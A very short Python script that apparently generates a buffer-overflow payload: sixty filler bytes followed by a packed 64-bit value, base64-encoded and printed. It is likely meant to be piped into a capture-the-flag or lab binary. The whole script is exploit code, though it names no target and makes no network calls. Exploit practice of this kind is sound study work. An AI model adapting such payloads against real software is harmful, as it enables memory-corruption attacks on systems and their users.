
import sys
import struct
import base64

buf = b'RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR'
buf += struct.pack('<Q', 3537280579709801504)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
